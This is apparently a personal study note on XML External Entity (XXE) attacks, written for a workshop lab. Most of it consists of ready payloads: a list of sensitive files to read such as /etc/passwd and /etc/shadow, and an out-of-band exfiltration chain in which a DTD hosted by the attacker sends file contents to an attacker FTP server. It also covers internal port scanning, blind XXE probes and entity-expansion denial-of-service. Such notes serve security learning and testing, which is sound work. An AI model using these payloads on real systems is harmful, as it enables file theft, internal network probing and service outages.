**Lab**
    [xxe-workshop](https://github.com/GoSecure/xxe-workshop)

---

### Concept
-    this attack is for which the appilication parse XML input
-    this attack may leads to confidential data, denial of service, SSRF, port scaning...
		- some Impact of xxe 
			- arbitary file read , Data ex-filteration of source code / configuration files.
			-    SSRF
					-    Exposure of internal services  
					- Enumerations of internal services via port scanning  
					- stealing cloud credentails via metadata instances  
					- DOS  
					- Directory listing  
					- RCE
					---

### XML Essential

-    DTD , this define the document structure with list of validated elemnts and attributes.
 syntax:- 
       <! DOCTYPE rootnode [
   				<! ENTITY test “hello world">
   		]>
		
		    we cannot inject a DTD in the middle of XML body.

**Entity**
-    Internal Entity :-
	    <! ENTITY name “value">  
  	usage - < sample>xyz &name;< /sample>  
	output - < sample>xyz value< /scample>
-    External Entity:-
	    <! EN includeme SYSTEM “include.xml”>  
		<! EN includeme2 SYSTEM “_remote.xml”>  
	usage - <sample>  
				< head>Header< /head>  
				< first>&includeme< /first>  
				< second>&includeme2< /second>  
				< /sample>  
	output - <sample>  
				< head>header< /head>  
				< first><body> content< /body>< /first>  
				< second><body> contect< /body>< /second>  
				< /sample>
					

-   Parameter Entity:-     An Entity value define another Entity.
					    <! ENTITY %param1 “<! ENTITY variable1 ”hello world">">
					    usage - <!EN triger1 “msg &variable1 ">  
						<! EN variable1 “hello world ">  
						OR  
						< sample>  
						< first>msg & variable1 </first  
						< second>&triger1 < /second>  
						< /sample>
							
---
	
### XML Entities
- Intersting file to read:-
		file:///etc/passwd  
		file:///etc/shadow  
		 file:///etc/hosts  
		 file:///etc/resolv.conf  
		 file:///proc/self/net/dev  
		 file:///proc/self/cwd/FILE  
		 file:///proc/self/cmdline  
		 file:///proc/self/environ  
		 file:///proc/version  
		 file:///etc/lsb-release  
		 file:///etc/issue  
		 file:///dev/urandom  
		 file:///dev/zero
							
							
-    try above file when defining the Entities.  
  
eg. <! EN File system “file:///etc/passwd”>  
  
< data>&file</ data>
		
							
---
							
### Exfilteration with local DTD
							
-  initilize local DTD
-    override one of its Entities
-    Evalute element and entity from local DTD
							
							
-    capture the request which parse xml input and insert our payload  
<! DOCTYPE data [  
<! ENTITY xxe SYSTEM "file:///anything">  
]>
-   if the above request says "no such file", then try bruteforce in intruder bar.  
	select after file:/// and add DTD local file possible directory, from [https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt](https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt)
							
-    if any request says "no such file" , find which directory or file is it an dget payload for it from here [https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) , exploit.
							
	**    every request must be urlencoded, you can use Hackvertor extension in burp**
							
	---
							
### Out-of-bond
-    when we make request which is not supposed to get to normal users but some how it may have executed in background but we are unable to get the data.
-    an attacker may host a DTD file in his own domain, the attacker attack through his own domain so the result will get placed in his log, which is filtered from the normal users.

- Steps:-				
-    capture the request and insert our payloadin the xml value  
<! DOCTYPE data [  
<! ENTITY xxe SYSTEM "file:///etc/passwd">  
]>  
- above request may execute in bg. to bypass it follow the below steps

-    create a xml file  
< ? xml version="1.0"?>  
<! DOCTYPE svg [  
<! ENTITY % asd SYSTEM “http://pythonserveripadd:port/xxe.dtd”>%asd;%c;  
]>  
< svg>&rrr;< /svg>  
◇replace the above xml file with this.
	
creating xxe.dtd file  
  
• create xxe.dtd file in your server  
	<! ENTITY % d SYSTEM “file:///etc/passwd”>  
	<! ENTITY % c “<! ENTITY rrr SYSTEM ‘ftp://ip:port/%d;’>">
	
-   start the python server to get access to xxe.dtd file . (SimpltHTTPServer)  
- start the ftp server to read the file , here we use [https://github.com/lc/230-OOB](https://github.com/lc/230-OOB)  
	- /etc/passwd will be listed here  
  
[https://www.xxe.sh](https://www.xxe.sh) check it out.

---
	
### XXE internal port scanning
-     capture the request and replace with your payload  
< ?xml version="1.0" encoding-"UTF-8"?>  
< !DOCTYPE root SYSTEM “http://127.0.0.1:1">[  
< !ELEMENT root (#PCDATA)>  
]>  
< root>< name>name< /name>< password>passwd</ password>< /root>
						
-    if the above the request take longer time to get response it means port number 1 is open (usually it take 5 -10 millisecond) and check other ports too.
---
### Blind XXE
-    we won't be able to get contents , data statuses will not posssible over here, in this case we call it as Blind XXE.
										   
-  easier way to find this is to try to load remote resources such s burp collabarator.  
	try this xml code  
	< ?xml version="1.0"?>  
	< !DOCTYPE abc [  
	< !ENTITY % ext SYSTEM “burp_collabarator_url/xyx”>%ext;  
	]>  
  
if you get a request in burp collabarator, their maybe Blind XXE

OR 
-    if there is an url/path/file/load/query parameter  
		- host a xml file in public server xxe.xml  
			< ?xml version="1.0"?>  
			<! DOCTYPE abc [  
			<! ENTITY % ext SYSTEM “burP-collabarotor_url/xyz”>%ext; 
			]>
				
								
								
-    we have to play with content-type header HTTP Request payloads.  
		- eg. content-type: application/json change this to content-type:application/xml ,you may get error in there. then convert your input to xml the nyou can perform the attack over there.
	---
								
### XML Entity Expansion
-    XML Generic Entity Expansion -		
		-  attacker has to declare a Entity with overlong content and use the entity many time in the API.
			 < ?xml version="1.0"?>  
		<! DOCTYPE xyz [  
		<! ENTITY x “overlong content with morethan 10^5 characters”>  
		]>  
		◇this can cause a blow of DoS Attack.
	
								 
-    XML Recursive Entity Expansion -
			 <! DOCTYPE abc [  
			<! ENTITY x1 “xyz” >  
			<! ENTITY x2 “&x1;&x1;” >  
			<! ENTITY x3 “&x2;&x2;” >  
			<! ENTITY x4 “&x3;&x3;” >  
			]>
			- what if we create till 100 Entity its called Recursive Entity Expansion. it is also called xmlboomb attack.
								 
-    XML Remote Entity Expansion -  
		 <! DOCTYPE abc [  
		<! ENTITY attack SYSTEM “__malicious.dtd”>  
		]>  
		- above malicious.dtd point to dtd that contaent external entity definition.  
		-  when using this attack , an attacker defines external dtd (malicious.dtd) that also point to external entitty (eg. external.dtd) and loop continues, this called xml remote entity expansion.
-    XML C14N Entity Expansion -
		- same as XML Remote Entity Expansion, only difference is the entities are resolved during the canonicalization process.